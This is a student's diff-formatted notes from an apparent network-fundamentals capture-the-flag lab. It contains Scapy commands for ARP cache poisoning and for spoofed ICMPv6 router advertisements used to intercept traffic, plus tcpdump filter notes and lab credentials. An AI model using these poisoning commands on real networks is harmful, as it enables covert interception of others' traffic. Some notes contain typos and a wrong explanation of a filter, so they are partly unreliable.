@@ -1,0 +1,198 @@
+ssh student@10.50.22.245 -X
+  >>password
+  
+  ssh connections:
+  server
+  client
+  session
+  keys
+    -user key: asymmetric public key used to identify user to the server
+    -host key: asymmetric public key used to identify server to the user
+    -session key: symmetric key created by the client
+Gorgas Network Validation (GNV)
+XX OCT 2023
+Start Time: ~1300
+Duration: 4 hour
+
+Type of Operation: Network & Protocol familiarization, Custom Packet Creation & Manipulation
+
+Objective: Identify and Validate the methods of encapsulation, header manipulation, packet traversal, and header structure in order to assist Gorgan Cyber Forces. Craft Custom ARP Requests and obfuscated ICMPv6 packets to enable Gorgas Cyber Forces to perform effective host discovery and Manipulation. You will use scapy and leverage ARP functions to manually "discover" your windows host, as a valid test case to provide to their cyber forces. You will use scapy and leverage IPv6 auto configuration functions to create a means of IPv6 direct communications between the Linux and Windows Machine.
+
+
+Scenario Credentials: NETWORK FUNDAMENTALS - START FLAG = N3tw0rkFund3m3nt@ls
+
+--------------------------------------------------------------
+THIS SHIT IS WHACK <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+Task 1
+
+Packet Manipulation
+
+Type of Operation: Reconnaissance and Data Interception
+
+Objective: Intel has been provided about sensitive information being sent over the network from an unknown source to T3. The targets are using ICMP as a covert channel to circumvent security. You are tasked with intercepting this data stream without the target suspecting the data stream has been compromised. You are instructed to perform a man-in-the-middle attack using Gratuitous ARPs from a system on the same network as the target. Utilizing T2, create a SCAPY script to perform a MitM and intercept the data transmission.
+
+    START FLAG = {provided in notification}
+
+    Task: Scapy Man in the Middle (MitM) with ARP
+
+    Utilize the targets T1 , T2 , T3 , and T4 to develop a Scapy MitM using Gratuitous ARPs.
+  
+    From T2, perform a ARP poison against T3 to change the gateway (T4) MAC to the MAC of T2 .
+    From T2, perform a ARP poison against T4 to change the T3 MAC to the MAC of T2 .
+
+    From T2, utilize TCPDUMP or Wireshark to intercept the FLAG being sent.
+OPNOTES:
+  ssh into T2 with creds provided
+  sudo scapy
+    need to send two headers
+    a =Ether() << creates Ether header, needs an arp header to follow it
+    a.type=0x0806 << changes the type to ARP
+    a.show() << shows the dst, src, and type
+    
+    
+    b =ARP() << makes an ARP header
+    b.op=2 << changes the op from who-has, to is-at
+    b.psrc="172.16.82.115" << changes the src to T3, which reassigns the hwsrc mac address
+    b.pdst="172.16.82.126" << where it's poisoning (T4)
+    b.show()
+    
+    
+    c =ARP() << makes an ARP header
+    c.op=2 
+    c.pdst="172.16.82.115"
+    c.psrc="172.16.82.126"
+    
+    sendp(a/b, iface="etho0"); sendp(a/c, iface="etho0") << sends the headers
+    
+    sudo tcpdump icmp and host 172.16.82.115 -X
+    
+    
+--------------------------------------------------------------
+
+Task 2
+
+Packet Manipulation 2
+
+Type of Operation: Reconnaissance and Data Interception
+
+Objective: Intel has been provided about sensitive information being sent over the network from T3 to an unknown target. The targets are using ICMPv6 as a covert channel to circumvent security. You are tasked with intercepting this data stream without the target suspecting the data stream has been compromised. You are instructed to perform a Stateless Address Auto-Configuration (SLAAC) man-in-the-middle attack using ICMPv6 from a system on the same network as the target. Utilizing T2, create a SCAPY script to perform a MitM and intercept the data transmission.
+
+    START FLAG = {provided in notification}
+
+    Task: Scapy Man in the Middle (MitM) with ICMPv6
+
+    Utilize the targets T1, T2, and T3 to create a SLAAC Router Advertisement message using Scapy to create a MitM.
+
+    From T2, send a SLAAC ICMPv6 Router Advertisement message to T3.
+
+    From T2, utilize TCPDUMP or Wireshark to intercept the FLAG being sent.
+
+OPNOTES:
+    a=IPv6()
+    a.dst= "ff02::1" << all nodes multi cast address
+    
+    b=ICMPv6ND_RA() << router advertisement header
+    
+    c=ICMPv6NDOptSrcLLAddr() << source link local address option header
+    
+      c.lladdr=[MY:MAC:ADD:RESS]
+
+   d=ICMPv6NDOptMTU() MTU option header
+   
+   e=ICMPv6NDOptPrefixInfo() << prefix info header
+    e.prefix = "fd00:deaf:cafe::"
+    e.prefixlen = "64"
+    
+    send(a/b/c/d/e, iface="eth0")
+   
+   THIS STUFF IS USELESS ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+--------------------------------------------------------------
+
+Task 3
+
+Basic Analysis - Utilizing Berkeley Packet Filters
+
+Type of Operation: PCAP Examination
+
+Objective: You have been given a pcap of unknown contents for examination. You are tasked with performing basic analysis of the contents of this pcap using Berkeley Packet Filters (BPF).
+
+    START FLAG = {provided in notification}
+
+op  notes:
+    curl cht.sh/tcpdump
+    
+         sudo tcpdump -D << lists interfaces
+         sudo tcpdump -i [interface name] << captures packets on that interface
+         sudo tcpdump -i [interface] -X << hex dump info
+         sudo tcpdump -i [interface] -XXvvvn << most verbose hex dump (reccomened)
+                                     -w test.pcap << writes the capture to a pcap
+                         tcpdump     -r test.pcap << reads the pcap
+          sudo tcpdump port 22 -XXvvv << captures all ssh traffic 
+                       portrange 20-100 and host 10.0.0.0 << gets all port in range on specific host
+          
+    
+  tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != ........
+                  ^12th offset, 2 bytes deep
+  
+  
+  tcp[13] = 0x11 << looks for only ack and fin turned on
+  ^^^^ looks at byte and check is only the 1 bit and the other 1 bit are on
+  tcp[13] & 0x11 = 0x11 << looks for ack and fin, but others may be turned on 
+  tcp[13] & 0x11 !=0 << at least one of the bits must equal zero, others may be set
+ cwr ece urg ack | psh rst syn fin
+ 8   4   2    1    8   4   2   1
+ 
+ n
+--------------------------------------------------------------
+
+Scheme of Maneuver:
+Task 1
+> INTERNET_HOST (T1)
+→ BLUE_HOST-1 (T2)
+→ BLUE_HOST-4 (T3)
+→ BLUE_POP-Router (T4)
+
+
+Task 2
+> INTERNET_HOST (T1)
+→ BLUE_HOST-1 (T2)
+→ BLUE_HOST-4 (T3)
+
+
+Task 3
+> INTERNET_HOST (T1)
+
+--------------------------------------------------------------
+
+Tools/Techniques: Tcpdump, Tshark, Open Source Research (OSR), Wireshark, to Monitor and View your custom packets. Scapy, a packet manipulation program.
+
+Prior Approvals: All connections will be established from your analyst Op Stations. Provide all findings through the associated CTF challenges:
+
+Target Section:
+
+--------------------------------------------------------------
+
+T1
+Hostname: INTERNET_HOST
+External IP: 10.50.XXX.XXX (ALREADY PROVIDED)
+Internal IP: 10.10.0.40 (ALREADY PROVIDED)
+creds: student:password
+Action: Use as a pivot to access T2
+
+T2
+Hostname: BLUE_HOST-1
+IP: 172.16.82.106
+creds: student:password
+Action: Successfully perform a ARP MitM using Scapy
+
+T3
+Hostname: BLUE_HOST-4
+IP: 172.16.82.115
+creds: (none)
+Action: Suspected client recieving sensitive information
+
+T4
+Hostname: BLUE_POP-Router
+IP: 172.16.82.126
+creds: vyos:password
+Action: Gateway of the network
